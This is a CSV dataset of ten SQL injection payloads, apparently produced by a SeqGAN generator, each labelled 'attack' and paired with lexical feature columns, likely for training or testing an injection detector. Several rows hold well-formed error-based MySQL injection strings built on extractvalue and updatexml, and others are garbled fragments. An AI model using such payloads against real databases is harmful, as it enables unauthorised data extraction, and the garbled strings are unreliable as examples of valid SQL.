label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1%iknc%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,0,14.0,9.0,2.950212064914747,4.0,1.0,4.0,5.0,0.2857142857142857,0.07142857142857142,0.2857142857142857,0.35714285714285715,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and updatexml 1812  (  (  3393,concat  (  (  (  (  benchmark  (  (  (  5000000(  (  0x2e,0x7171706a71,  (  =  (  9627,md5  (  =  (  3393,1   )    (  extractvalue  (  1808,concat  (  (  (  (  0x2e,md5  (  (  select   (  case and 0   (  8375  (  9103  =  (  (  8862,concat  (  (  (  0x2e,0x7171706a71  (  5000000(  (  (  3393  =  (  3393,mdua  (  e  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1,352.0,34.0,3.7428387234022926,83.0,85.0,130.0,54.0,0.23579545454545456,0.24147727272727273,0.3693181818181818,0.1534090909090909,0.0,1.0,0.0,0.0,0.0,4.0,0.0,38.0,1.0,0.0,10.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""x$",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,2,156.0,28.0,3.7475997057412926,40.0,35.0,57.0,24.0,0.2564102564102564,0.22435897435897437,0.36538461538461536,0.15384615384615385,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     extractvalue  (  9627,concat  (  (  (  (  (  0x5c,  (  (  (  benchmark  (  (  5000000(  (  (  0x2e,0x7171706a71,0x7171706a71,  (  (  benchmark  (  (  (  (  benchmark  (  8862,concat  (  (  (  (  =  (  (  =  (  (  3393,concat  (  (  3393,0x7171706a71,  (  select   (  elt  D  (  (  5000000,0x7171706a71(  (  5883t  (   (  8375  (  (  5000000(  (  (  1297  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,3,379.0,33.0,3.6298275503973128,80.0,94.0,142.0,63.0,0.21108179419525067,0.24802110817941952,0.37467018469656993,0.1662269129287599,0.0,1.0,0.0,0.0,0.0,3.0,0.0,48.0,1.0,0.0,10.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,4,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,5,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%%'  =  'k'  =  'ck,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,6,20.0,7.0,2.4219280948873623,3.0,1.0,8.0,8.0,0.15,0.05,0.4,0.4,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%k'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,7,166.0,29.0,3.7294590632136018,38.0,39.0,63.0,26.0,0.2289156626506024,0.23493975903614459,0.3795180722891566,0.1566265060240964,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%kprocen FROM analyse  (  )  elte  (  elte  (  elt  (  1808  =  1   )    (  select   (  extractvalue  (  (  (  (  0x2e,0x7171706a71,9627,m5  (  (  0x52515a50   (  1354  (  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  (  0x5c,  (  (  benchmark  (  (  select   (  elt  (  e  (  7982  =  (  3393,1   (  case 0 fromual",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,8,463.0,41.0,3.8707793609963907,126.0,104.0,170.0,63.0,0.27213822894168466,0.22462203023758098,0.367170626349892,0.13606911447084233,0.0,2.0,0.0,0.0,0.0,3.0,0.0,43.0,2.0,0.0,13.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,9,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
